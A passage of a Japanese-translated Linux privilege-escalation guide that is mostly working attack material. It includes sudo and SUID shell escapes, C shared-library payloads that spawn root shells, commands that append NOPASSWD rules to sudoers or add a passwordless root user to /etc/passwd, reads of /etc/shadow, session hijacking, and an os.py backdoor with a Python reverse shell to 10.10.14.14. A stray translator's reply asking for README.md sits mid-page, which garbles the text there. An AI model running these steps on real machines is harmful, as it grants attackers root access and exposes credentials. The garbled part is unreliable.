grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 既知のパスワード

環境の**パスワードを知っている**場合は、そのパスワードを使って**各ユーザーにログインを試みてください**。

### Su Brute

もし大量のノイズを出しても構わず、`su` と `timeout` バイナリがマシンに存在するなら、[su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は `-a` パラメータでユーザーを brute-force することも試みます。

## Writable PATH の悪用

### $PATH

もし $PATH のあるフォルダに**書き込みできる**ことが分かったら、別のユーザー（理想的には root）が実行するコマンド名で書き込み可能なフォルダ内に**backdoor を作成する**ことで権限昇格できる可能性があります。作成する backdoor は、$PATH 上であなたの書き込み可能なフォルダより前に位置するフォルダから**ロードされない**こと（つまり実行時にあなたのフォルダが参照されること）が重要です。

### SUDO and SUID

sudo を使って実行できるコマンドがあるか、またはそれらに suid ビットが設定されている場合があります。以下で確認してください:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
場合によっては、**予期しないコマンドの中にはファイルの読み取りや書き込み、さらにはコマンドを実行できるものがあります。** 例えば：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudoの設定により、ユーザーがパスワードを知らなくても別のユーザーの権限でコマンドを実行できることがある。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例では、ユーザー `demo` が `root` として `vim` を実行できます。ssh key を root directory に追加するか、`sh` を呼び出すことで shell を取得するのは非常に簡単です。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブは、何かを実行する際にユーザーが**環境変数を設定する**ことを許可します:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例、**based on HTB machine Admirer** は、スクリプトを root として実行する際に任意の python library をロードするための **PYTHONPATH hijacking** に **vulnerable** でした:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV が sudo env_keep によって保持される → root shell

もし sudoers が `BASH_ENV` を保持している場合（例: `Defaults env_keep+="ENV BASH_ENV"`）、Bash の非対話型起動時の挙動を利用して、許可されたコマンドを呼び出すときに arbitrary code を root として実行できます。

- 動作する理由: 非対話型シェルでは、Bash は `$BASH_ENV` を評価し、ターゲットスクリプトを実行する前にそのファイルを source します。多くの sudo ルールはスクリプトやシェルラッパーの実行を許可しています。`BASH_ENV` が sudo によって保持されていると、あなたのファイルは root 権限で source されます。

- 要件:
- 実行できる sudo ルール（`/bin/bash` を非対話的に呼び出すターゲット、または任意の bash スクリプト）。
- `BASH_ENV` が `env_keep` に含まれていること（`sudo -l` で確認）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- ハードニング:
- `BASH_ENV`（および`ENV`）を`env_keep`から削除し、`env_reset`を優先する。
- sudoが許可されたコマンドに対するシェルラッパーは避け、最小限のバイナリを使用する。
- 保持された環境変数が使用される場合、sudoのI/Oログとアラートを検討する。

### Sudo 実行バイパスの経路

**ジャンプ**して他のファイルを読むか、**symlinks**を使用する。例えば sudoers ファイルでは: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
もし **ワイルドカード** が使われている (\*)、さらに簡単になります:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary: コマンドのパスが指定されていない場合

もし**sudo permission**が単一のコマンドに対して**パスが指定されずに**付与されている場合: _hacker10 ALL= (root) less_、PATH変数を変更することで悪用できます。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
このテクニックは、**suid** バイナリ **がパスを指定せずに別のコマンドを実行する場合（必ず** _**strings**_ **で怪しい SUID バイナリの内容を確認してください）**。

[実行用のPayload例.](payloads-to-execute.md)

### SUID バイナリ（コマンドのパス指定）

もし **suid** バイナリが **パスを指定して別のコマンドを実行する** 場合、suid ファイルが呼び出すコマンド名と同じ名前の関数を **export a function** してみてください。

例えば、もし suid バイナリが _**/usr/sbin/service apache2 start**_ を呼び出すなら、同名の関数を作成して export する必要があります：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
その後、suid binary を呼び出すと、この関数が実行されます

### LD_PRELOAD & **LD_LIBRARY_PATH**

環境変数 **LD_PRELOAD** は、ローダーが他のすべてのライブラリよりも先に読み込む 1つまたは複数の共有ライブラリ（.so ファイル）を指定するために使用されます。標準 C ライブラリ（`libc.so`）も含まれます。この処理はライブラリのプリロードと呼ばれます。

しかし、この機能が悪用されるのを防ぎ、システムのセキュリティを維持するために、特に **suid/sgid** 実行ファイルに関して、システムはいくつかの条件を強制します:

- ローダーは、real user ID (_ruid_) が effective user ID (_euid_) と一致しない実行ファイルに対して **LD_PRELOAD** を無視します。
- suid/sgid を持つ実行ファイルの場合、プリロードされるのは標準パス内でかつ suid/sgid でもあるライブラリのみです。

Privilege escalation は、`sudo` でコマンドを実行する権限があり、`sudo -l` の出力に **env_keep+=LD_PRELOAD** が含まれている場合に発生する可能性があります。この設定により、`sudo` でコマンドを実行しても **LD_PRELOAD** 環境変数が保持され認識されるため、結果として任意のコードが elevated privileges で実行される可能性があります。
```
Defaults        env_keep += LD_PRELOAD
```
**/tmp/pe.c** として保存
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
次に、**コンパイルする**には、次を使用します:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、**escalate privileges** を実行します
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 類似の privesc は攻撃者が **LD_LIBRARY_PATH** env variable を制御している場合に悪用され得る。なぜなら攻撃者がライブラリが検索されるパスを制御できるからだ。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

通常と異なる**SUID**権限を持つbinaryに遭遇した場合、正しく**.so**ファイルをロードしているか確認することをおすすめします。これは次のコマンドを実行して確認できます:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、_"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ のようなエラーに遭遇した場合、それは悪用の可能性を示唆します。

これを悪用するには、例えば _"/path/to/.config/libcalc.c"_ というCファイルを作成し、以下のコードを含めます:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルして実行すると、ファイルのパーミッションを操作し、特権昇格したシェルを実行することで権限を昇格させることを目的としています。

上記の C ファイルを shared object (.so) ファイルにコンパイルするには、次のようにします:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最後に、影響を受けた SUID binary を実行すると、エクスプロイトがトリガーされ、システムが侵害される可能性があります。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
書き込み可能なフォルダからライブラリをロードする SUID binary を見つけたので、そのフォルダに必要な名前でライブラリを作成しましょう:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
次のようなエラーが発生した場合
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、攻撃者がローカルのセキュリティ制限を回避するために悪用できるUnixバイナリを厳選してまとめたリストです。[**GTFOArgs**](https://gtfoargs.github.io/) は、コマンドに**引数のみを注入できる**場合を対象にした同様のプロジェクトです。

このプロジェクトは、Unixバイナリの正規の機能を収集しており、それらは break out restricted shells、escalate or maintain elevated privileges、transfer files、spawn bind and reverse shells、およびその他の post-exploitation tasks の遂行に悪用され得ます。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` にアクセスできる場合、ツール [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使用して、sudo のルールを悪用できる方法が見つかるかどうかを確認できます。

### Reusing Sudo Tokens

パスワードがわからないが **sudo access** がある場合、権限を昇格するために **waiting for a sudo command execution and then hijacking the session token** という手法を利用できます。

Requirements to escalate privileges:

- あなたは既にユーザー _sampleuser_ としてシェルを持っている
- _sampleuser_ は **used `sudo`** によって過去 **last 15mins** に何かを実行している（デフォルトではこれは、パスワードを入力せずに `sudo` を使える sudo トークンの有効期間です）
- `cat /proc/sys/kernel/yama/ptrace_scope` が 0 である
- `gdb` にアクセスできる（アップロードできること）

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **次を使用して権限を昇格できます:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. これを使って **セッション内の sudo トークンを有効化**できます（自動的に root シェルが得られるわけではありません。`sudo su` を実行してください）:
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- その **second exploit** (`exploit_v2.sh`) は _/tmp_ に **root 所有で setuid の** sh shell を作成します
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **3番目の exploit** (`exploit_v3.sh`) は、**sudoersファイルを作成し、sudo tokens を永続化してすべてのユーザーが sudo を使用できるようにします**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

フォルダ自体、またはフォルダ内に作成されたファイルのいずれかに対して**書き込み権限**がある場合、バイナリ[**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools)を使って**ユーザーとPIDのsudoトークンを作成**できます。\
例えば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、かつそのユーザーとしてPIDが1234のシェルを持っている場合、パスワードを知らなくても次のようにして**sudo権限を取得**できます:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

ファイル `/etc/sudoers` および `/etc/sudoers.d` 内のファイルは、誰が `sudo` を使用できるかおよびその方法を設定します。これらのファイルは**by default can only be read by user root and group root**。\
**If** このファイルを**read**できるなら、**obtain some interesting information**を得られる可能性があり、任意のファイルに**write**できるなら、**escalate privileges**が可能になります。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
書き込み権があれば、この権限を悪用できます。
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD向けの`doas`のように、`sudo`バイナリの代替となるものがいくつかあります。設定は`/etc/doas.conf`を確認してください。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

If you know that a **ユーザが通常マシンに接続して権限昇格に `sudo` を使用する** and you got a shell within that user context, you can **新しい sudo 実行ファイルを作成する** that will execute your code as root and then the user's command. Then, **ユーザコンテキストの $PATH を変更する** (for example adding the new path in .bash_profile) so when the user executes sudo, your sudo executable is executed.

Note that if the user uses a different shell (not bash) you will need to modify other files to add the new path. For example [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. You can find another example in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

または次のようなコマンドを実行するなど:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

ファイル `/etc/ld.so.conf` は、**読み込まれる設定ファイルの所在**を示します。通常、このファイルには次のパスが含まれます: `include /etc/ld.so.conf.d/*.conf`

つまり、`/etc/ld.so.conf.d/*.conf` の設定ファイルが読み込まれます。これらの設定ファイルは、**別のフォルダを指しており**、そこで**ライブラリ**が**検索されます**。例えば、`/etc/ld.so.conf.d/libc.conf` の内容が `/usr/local/lib` の場合、**システムは `/usr/local/lib` 内でライブラリを検索します**。

もし何らかの理由で示されたパスのいずれか（`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` の設定ファイルが指す任意のフォルダ）に対して**ユーザが書き込み権限を持っている**場合、特権昇格が可能になることがあります。\
以下のページで、**この設定ミスをどのように悪用するか**を確認してください：


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
libを`/var/tmp/flag15/`にコピーすると、`RPATH`変数で指定されているとおり、その場所でプログラムによって使用されます。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
次に、`/var/tmp` に悪意のあるライブラリを作成します。`gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` を実行します。
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilitiesはプロセスに対して利用可能なroot権限の**一部を提供します**。これによりrootの**権限がより小さく識別可能な単位に分割されます**。これらの各単位はプロセスに対して個別に付与できます。こうして権限の全体セットが縮小され、悪用のリスクが低減します。\
以下のページを読んで、capabilitiesとそれを悪用する方法について**詳しく学んでください**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

ディレクトリでは、**"execute" のビット**は対象ユーザーが "**cd**" でフォルダに入れることを意味します。\
**"read"** ビットはユーザーが**ファイルを一覧表示(list)**できることを意味し、**"write"** ビットはユーザーが**ファイルを削除**および**新規作成**できることを意味します。

## ACLs

Access Control Lists (ACLs) は任意の権限の二次層を表し、従来の ugo/rwx 権限を**上書きすることができます**。これらの権限は、所有者やグループの一員でない特定のユーザーに対して許可や拒否を設定することで、ファイルやディレクトリへのアクセス制御を強化します。このレベルの**粒度により、より精密なアクセス管理が可能になります**。詳しくは[**here**](https://linuxconfig.org/how-to-manage-acls-on-linux)を参照してください。

**付与** ユーザー "kali" にファイルの読み書き権限を付与する:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**取得** システムから特定のACLsを持つファイル:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## shell sessions を開く

**old versions** では、別ユーザー（**root**）のいくつかの**shell** session を**hijack**できる場合があります。\
**newest versions** では、**your own user** の screen sessions にのみ**connect**できます。ただし、session 内に**interesting information inside the session**が含まれていることがあります。

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**セッションにアタッチする**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

これは **古い tmux バージョン** の問題でした。root によって作成された tmux (v2.1) セッションを、非特権ユーザーとして hijack できませんでした。

**tmux セッションを一覧表示**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**セッションにアタッチする**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
例については **Valentine box from HTB** を確認してください。

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006年9月から2008年5月13日までの間にDebian系システム（Ubuntu、Kubuntuなど）で生成されたすべてのSSLおよびSSHキーはこの脆弱性の影響を受ける可能性があります。\
このバグはこれらのOSで新しい ssh キーを作成する際に発生し、**可能な変種は32,768通りしかなかった**ためです。つまり、全ての可能性を計算でき、**sshの公開鍵を持っていれば対応する秘密鍵を探索できる**ということです。計算済みの候補はここで見つかります: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** パスワード認証が許可されているかどうかを指定します。デフォルトは `no` です。
- **PubkeyAuthentication:** 公開鍵認証が許可されているかどうかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: パスワード認証が有効な場合に、サーバーがパスワードが空のアカウントへのログインを許可するかどうかを指定します。デフォルトは `no` です。

### PermitRootLogin

rootがsshでログインできるかどうかを指定します。デフォルトは `no` です。可能な値:

- `yes`: rootはパスワードと秘密鍵の両方でログインできます
- `without-password` or `prohibit-password`: rootは秘密鍵のみでログインできます
- `forced-commands-only`: rootは秘密鍵のみでログインでき、かつcommandsオプションが指定されている必要があります
- `no`: rootはログインできません

### AuthorizedKeysFile

ユーザー認証に使用できる公開鍵を含むファイルを指定します。 `%h` のようなトークンを含めることができ、これはホームディレクトリに置き換えられます。 **絶対パスを指定できます** (`/`で始まる) または **ユーザーのホームからの相対パス**。例えば:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定は、ユーザー "**testusername**" の **private** 鍵でログインしようとすると、ssh があなたの鍵の public key を `/home/testusername/.ssh/authorized_keys` と `/home/testusername/access` にあるものと比較することを示します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding は、サーバー上に鍵（パスフレーズ無し！）を残さずに **use your local SSH keys instead of leaving keys** ことを可能にします。つまり、ssh で **to a host** に **jump** し、そこから別のホストへ **jump to another** するときに、**initial host** にある **key** を **using** することができます。

このオプションは `$HOME/.ssh.config` に以下のように設定する必要があります:
```
Host example.com
ForwardAgent yes
```
注意：`Host` が `*` の場合、ユーザーが別のマシンに移動するたびに、そのホストはキーにアクセスできてしまいます（これはセキュリティ上の問題です）。

ファイル `/etc/ssh_config` はこれらの **options** を **override** し、この設定を許可または拒否することができます。\
ファイル `/etc/sshd_config` はキーワード `AllowAgentForwarding` を使って ssh-agent フォワーディングを **allow** または **denied** に設定できます（デフォルトは allow）。

環境で Forward Agent が設定されているのを見つけたら、次のページを参照してください。**悪用して権限昇格できる可能性があるため**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 興味深いファイル

### プロファイルファイル

ファイル `/etc/profile` および `/etc/profile.d/` 以下のファイルは、ユーザーが新しいシェルを起動したときに実行される **ユーザーが新しいシェルを起動したときに実行されるスクリプト** です。したがって、それらのいずれかに **書き込みまたは変更ができる場合、権限を昇格させることができます**。
```bash
ls -l /etc/profile /etc/profile.d/
```
怪しいプロファイルスクリプトが見つかった場合は、**機密情報**が含まれていないか確認してください。

### Passwd/Shadow ファイル

OSによっては `/etc/passwd` や `/etc/shadow` ファイルが別名になっているか、バックアップが存在する場合があります。したがって、**それらをすべて見つけ出し**、**読み取れるか確認して**、ファイル内に**ハッシュが含まれているか**を調べることを推奨します:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
場合によっては、`/etc/passwd`（または同等のファイル）内に**password hashes**が見つかることがあります
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

まず、以下のいずれかのコマンドでパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
元の README.md の内容を貼ってください。翻訳はその内容に対して行います。  
また、`hacker` ユーザーをどの位置に追加するか（末尾に追記でよいか）と、生成パスワードを平文で含めるかハッシュで含めるかを教えてください。こちらで強力なパスワードを生成して挿入します。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `su` コマンドを `hacker:hacker` で使用できます

または、以下の行を使用してパスワードなしのダミーユーザーを追加できます。\
警告: マシンの現在のセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意: BSDプラットフォームでは `/etc/passwd` は `/etc/pwd.db` および `/etc/master.passwd` にあり、`/etc/shadow` は `/etc/spwd.db` に名前が変更されています。

次に、**write in some sensitive files** ができるか確認してください。例えば、**service configuration file** に書き込めますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、マシンが**tomcat**サーバを実行していて、**/etc/systemd/ 内の Tomcat サービス設定ファイルを変更できる,** その場合、次の行を変更できます:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
バックドアはtomcatが次回起動されたときに実行されます。

### フォルダの確認

次のフォルダにはバックアップや興味深い情報が含まれている可能性があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** （おそらく最後のものは読み取れないでしょうが、試してみてください）
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇妙な場所/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 直近数分で変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DBファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATHにあるスクリプト/バイナリ**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web ファイル**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### パスワードを含む既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) のコードを読んでください。これは **パスワードを含む可能性のある複数のファイル** を検索します。\
**もう一つの興味深いツール** として使えるのは: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) で、ローカルコンピュータに保存された多数のパスワードを取得するためのオープンソースアプリケーションです（Windows, Linux & Mac 向け）。

### Logs

ログを読むことができれば、**その中に興味深い／機密情報が含まれている**可能性があります。ログが奇妙であればあるほど、（おそらく）より興味深いでしょう。\
また、いくつかの**"bad"**に設定された（backdoored?）**audit logs**は、監査ログ内に**パスワードを記録する**ことを可能にする場合があります。詳しくはこの投稿を参照してください: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
ログを読むために **ログを読むグループ** [**adm**](interesting-groups-linux-pe/index.html#adm-group) は非常に役立ちます。

### シェルファイル
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

ファイル名や内容に"**password**"という単語が含まれているファイルも確認してください。また、logs内のIPsやemails、ハッシュのregexpsもチェックしてください。\
ここでこれらすべてのやり方を列挙するつもりはありませんが、興味があれば[**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)が実行する最後のチェックを確認できます。

## 書き込み可能なファイル

### Python library hijacking

もしpythonスクリプトが**どこから**実行されるか分かっていて、そのフォルダに**書き込みできる**か、あるいは**pythonライブラリを修正できる**なら、OSライブラリを改変してbackdoorすることができます（pythonスクリプトが実行される場所に書き込み可能であれば、os.pyライブラリをコピーして貼り付けてください）。

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate の悪用

